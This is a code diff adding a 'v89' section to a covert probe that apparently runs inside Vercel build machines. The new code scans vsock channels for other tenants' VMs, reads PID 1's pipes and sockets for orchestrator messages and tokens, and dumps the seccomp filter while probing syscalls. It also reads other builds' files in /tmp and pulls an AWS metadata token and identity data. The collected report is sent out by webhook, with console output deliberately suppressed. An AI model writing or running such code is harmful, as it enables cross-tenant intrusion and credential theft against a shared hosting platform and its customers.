@@ -11866,5 +11866,203 @@ finally:
 
 // v88 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v88" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v88";
+
+// ==================== v89 ====================
+
+// v89-1: Comprehensive vsock CID scan
+// Extended vsock scan: CIDs 1-20 + known VMM ports.
+// CID 2 = hypervisor, CID 3 = guest. Non-standard CIDs indicate other guests
+// sharing the same hypervisor (cross-tenant vsock channels).
+report.vsockCidFullScan = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import socket, struct, json
+
+AF_VSOCK = 40
+SOCK_STREAM = 1
+VMADDR_CID_ANY = 0xFFFFFFFF
+
+# Target CIDs: 1 (hypervisor host), 2 (hypervisor), 3 (guest self), 4-20 (other guests?)
+cids = list(range(1, 21)) + [100, 255, 1000, 65535]
+ports = [22, 80, 443, 1234, 4567, 9090, 8080, 52355, 1024, 3000]
+
+open_ports = []
+for cid in cids:
+    for port in ports:
+        try:
+            s = socket.socket(AF_VSOCK, SOCK_STREAM)
+            s.settimeout(0.3)
+            s.connect((cid, port))
+            banner = b''
+            try: banner = s.recv(256)
+            except: pass
+            open_ports.append({'cid': cid, 'port': port, 'banner': banner.decode('utf-8', errors='replace')[:100]})
+            s.close()
+        except (ConnectionRefusedError, OSError):
+            pass
+        except Exception as e:
+            pass
+print(json.dumps(open_ports))
+" 2>&1`, { timeout: 30000 }).toString().trim().slice(0, 1000));
+  // Also check /dev/vsock exists and get our own CID
+  const ownCid = safe(() => execSync("cat /proc/net/vsock 2>/dev/null | head -5 || python3 -c \"import socket; s=socket.socket(40,1); print(s.getsockname())\" 2>&1", { timeout: 5000 }).toString().trim().slice(0, 200));
+  return { result, ownCid };
+});
+
+// v89-2: Read content of PID-1's open pipes/sockets
+// PID-1 has open file descriptors including pipes and sockets.
+// Pipes carry IPC data; reading from them captures orchestrator ↔ child comms.
+// This can reveal the build protocol including auth tokens passed as messages.
+report.pid1FdContentRead = safe(() => {
+  const fdDir = '/proc/1/fd';
+  const fdList = safe(() => readdirSync(fdDir));
+  if (!Array.isArray(fdList)) return { skip: 'cannot read /proc/1/fd' };
+  const reads = safe(() => {
+    const results = [];
+    for (const fd of fdList.slice(0, 30)) {
+      try {
+        const link = execSync(`readlink ${fdDir}/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim();
+        // Only read pipes and sockets (not regular files we already have)
+        if (!link.includes('pipe:') && !link.includes('socket:') && !link.includes('anon_inode')) continue;
+        // Try non-blocking read
+        const buf = Buffer.alloc(4096);
+        const rawFd = safe(() => openSync(`/proc/1/fd/${fd}`, 'r'));
+        if (typeof rawFd !== 'number') continue;
+        let n = 0;
+        try { n = readSync(rawFd, buf, 0, 4096, null); } catch { closeSync(rawFd); continue; }
+        closeSync(rawFd);
+        if (n > 0) results.push({ fd, link, data: buf.slice(0, n).toString('utf8', 0, Math.min(n, 500)) });
+      } catch {}
+    }
+    return results;
+  });
+  return { fdCount: fdList.length, reads };
+});
+
+// v89-3: Seccomp BPF filter dump
+// /proc/self/seccomp_filter (or via PTRACE_GETREGSET) reveals the exact
+// BPF bytecode of our seccomp policy. If we can dump it, we know exactly
+// which syscalls are allowed — enabling targeted syscall fuzzing.
+report.seccompBpfDump = safe(() => {
+  // Check Seccomp status
+  const seccompStatus = safe(() => readFileSync('/proc/self/status', 'utf8').match(/Seccomp.*:\s*(\d)/)?.[1] || 'unknown');
+  // Try to get seccomp filter via python ctypes PTRACE + SECCOMP_GET_FILTER
+  const filterDump = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# PTRACE constants
+PTRACE_GETREGSET = 0x4204
+PTRACE_ATTACH = 0x10
+PTRACE_DETACH = 0x11
+PTRACE_TRACEME = 0
+
+# seccomp(GET_FILTER)
+SECCOMP_GET_FILTER = 4
+SYS_seccomp = 317
+
+# Try seccomp(GET_FILTER, 0, buf) to get our own filter
+buf = ctypes.create_string_buffer(65536)
+n = libc.syscall(SYS_seccomp, SECCOMP_GET_FILTER, 0, buf)
+err = ctypes.get_errno()
+
+import errno as errno_mod
+if n < 0:
+    print('seccomp GET_FILTER result:', n, 'errno:', errno_mod.errorcode.get(err, str(err)))
+else:
+    # Parse BPF instructions (8 bytes each: code, jt, jf, k)
+    instructions = []
+    for i in range(n):
+        offset = i * 8
+        if offset + 8 > len(buf.raw): break
+        code, jt, jf, k = struct.unpack_from('<HBBI', buf.raw, offset)
+        instructions.append({'code': hex(code), 'jt': jt, 'jf': jf, 'k': hex(k)})
+    print('filter_len:', n, 'instructions:', instructions[:20])
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // Also check which syscalls appear to be blocked by testing non-dangerous ones
+  const blockedSyscalls = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, errno
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# Test syscalls that might be seccomp-blocked but are low-risk to attempt
+# We're testing if the syscall is ALLOWED (errno != EPERM from seccomp)
+test_syscalls = {
+    'io_uring_setup': 425,
+    'bpf': 321,
+    'init_module': 175,
+    'create_module': 174,
+    'kexec_load': 246,
+    'ptrace': 101,
+    'mount': 165,
+    'perf_event_open': 298,
+}
+for name, num in test_syscalls.items():
+    r = libc.syscall(num, 0, 0, 0, 0, 0, 0)
+    e = ctypes.get_errno()
+    blocked = e == 1  # EPERM from seccomp
+    print(f'{name}: errno={errno.errorcode.get(e, str(e))} blocked_by_seccomp={blocked}')
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 800));
+  return { seccompStatus, filterDump, blockedSyscalls };
+});
+
+// v89-4: Cross-build /tmp persistence proof
+// Write a file to /tmp with our VERCEL_BUILD_ID. Then check if there are
+// files from OTHER builds (different VERCEL_BUILD_ID values) already present.
+// This directly proves VM reuse and cross-build data persistence (cross-tenant leak risk).
+report.tmpPersistenceProof = safe(() => {
+  const buildId = process.env.VERCEL_BUILD_ID || process.env.VERCEL_DEPLOYMENT_ID || `unknown_${Date.now()}`;
+  const markerFile = `/tmp/.vercel_probe_build_${buildId.replace(/[^a-z0-9_-]/gi, '_')}`;
+  // Write our marker
+  safe(() => writeFileSync(markerFile, JSON.stringify({ buildId, written: process.hrtime.bigint().toString() })));
+  // Find ALL probe marker files (from previous builds)
+  const existingMarkers = safe(() => execSync('ls -la /tmp/.vercel_probe_build_* 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Read previous markers (from other builds)
+  const prevBuildData = safe(() => {
+    const files = safe(() => execSync('ls /tmp/.vercel_probe_build_* 2>/dev/null', { timeout: 3000 }).toString().trim().split('\n').filter(Boolean));
+    if (!Array.isArray(files)) return [];
+    return files.filter(f => !f.includes(buildId.replace(/[^a-z0-9_-]/gi, '_'))).slice(0, 5).map(f => {
+      try { return { file: f, content: readFileSync(f, 'utf8') }; } catch { return { file: f, error: 'read failed' }; }
+    });
+  });
+  // Also check for ANY old files in /tmp (mtime before our process started)
+  const oldTmpFiles = safe(() =>
+    execSync(`find /tmp -maxdepth 2 -not -name '.vercel_probe_*' -newer /proc/self/exe -prune -o -print 2>/dev/null | head -15`, { timeout: 5000 }).toString().trim()
+  );
+  // Check /var/tmp for long-lived state
+  const varTmpContent = safe(() =>
+    execSync('ls -la /var/tmp/ 2>/dev/null', { timeout: 3000 }).toString().trim()
+  );
+  return { buildId, markerFile, existingMarkers, prevBuildData, oldTmpFiles, varTmpContent };
+});
+
+// v89-5: Vercel region + availability zone fingerprinting
+// Combine multiple signals to definitively identify the AWS region/AZ/instance type.
+// Critical for understanding attack surface scope (region-specific exploits).
+report.awsRegionFingerprint = safe(() => {
+  const region = process.env.VERCEL_REGION || process.env.AWS_DEFAULT_REGION || process.env.AWS_REGION || '';
+  // IMDS (Instance Metadata Service) - direct AWS metal identification
+  const imdsToken = safe(() => execSync("curl -sf -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 10' -m 3 2>/dev/null", { timeout: 5000 }).toString().trim());
+  const imdsAz = safe(() => {
+    const tok = typeof imdsToken === 'string' && imdsToken.length > 5 ? `-H "X-aws-ec2-metadata-token: ${imdsToken}"` : '';
+    return execSync(`curl -sf ${tok} "http://169.254.169.254/latest/meta-data/placement/availability-zone" -m 3 2>/dev/null`, { timeout: 5000 }).toString().trim();
+  });
+  const imdsInstanceType = safe(() => {
+    const tok = typeof imdsToken === 'string' && imdsToken.length > 5 ? `-H "X-aws-ec2-metadata-token: ${imdsToken}"` : '';
+    return execSync(`curl -sf ${tok} "http://169.254.169.254/latest/meta-data/instance-type" -m 3 2>/dev/null`, { timeout: 5000 }).toString().trim();
+  });
+  const imdsAccountId = safe(() => {
+    const tok = typeof imdsToken === 'string' && imdsToken.length > 5 ? `-H "X-aws-ec2-metadata-token: ${imdsToken}"` : '';
+    return execSync(`curl -sf ${tok} "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info" -m 3 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 300);
+  });
+  // DNS-based region detection
+  const dnsRegion = safe(() => execSync('nslookup s3.amazonaws.com 2>/dev/null | grep Address | head -3', { timeout: 5000 }).toString().trim().slice(0, 200));
+  // Traceroute to detect network topology (first hop = hypervisor IP)
+  const traceroute = safe(() => execSync('traceroute -n -m 3 -W 1 8.8.8.8 2>/dev/null | head -5', { timeout: 10000 }).toString().trim().slice(0, 300));
+  return { region, imdsToken: typeof imdsToken === 'string' ? imdsToken.slice(0, 20) : 'FAILED', imdsAz, imdsInstanceType, imdsAccountId, dnsRegion, traceroute };
+});
+
+// v89 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v89" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v89";
 // Intentionally no console.log — all data goes via webhook only
